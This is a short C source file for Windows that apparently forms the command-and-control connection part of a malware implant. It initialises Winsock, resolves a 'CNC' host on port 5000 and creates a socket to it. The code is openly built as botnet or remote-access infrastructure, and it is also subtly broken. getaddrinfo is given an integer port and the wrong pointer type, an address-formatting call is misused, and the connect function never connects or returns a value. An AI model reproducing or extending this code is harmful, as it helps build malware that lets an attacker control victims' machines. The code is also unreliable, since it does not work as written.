#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "logger.h"

#define CNC_PORT 5000

SOCKET cnc_sock = INVALID_SOCKET;

void init_winsock()
{
    WSADATA wsaData;
    int res;

    res = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (res != 0)
    {
        log_error("WSAStartup failed: %d\n", res);
        exit(EXIT_FAILURE);
    }
    log_debug("Initialized Winsock.");
}

void get_cnc_addrinfo(char *host, struct addrinfo *result)
{
    int res;
    struct addrinfo hints = {};
    char cnc_addr[32];

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    res = getaddrinfo(host, CNC_PORT, &hints, result);
    if (res)
    {
        log_error("getaddrinfo failed: %d\n", res);
        WSACleanup();
        exit(EXIT_FAILURE);
    }
    log_debug("CNC's address: %s", WSAAddressToStringA(result->ai_addr, result->ai_addrlen, result->ai_protocol, &cnc_addr, sizeof(cnc_addr)));
}

void init_cnc_sock(struct addrinfo *cnc_addrinfo)
{
    cnc_sock = socket(cnc_addrinfo->ai_family, cnc_addrinfo->ai_socktype, cnc_addrinfo->ai_protocol);

    if (cnc_sock == INVALID_SOCKET)
    {
        log_error("Error at socket(): %ld\n", WSAGetLastError());
        freeaddrinfo(cnc_addrinfo);
        WSACleanup();
        exit(EXIT_FAILURE);
    }
}

int connect_to_cnc(char *host)
{
    struct addrinfo cnc_addrinfo;

    init_winsock();
    get_cnc_addrinfo(host, &cnc_addrinfo);
    init_cnc_sock(&cnc_addrinfo);
}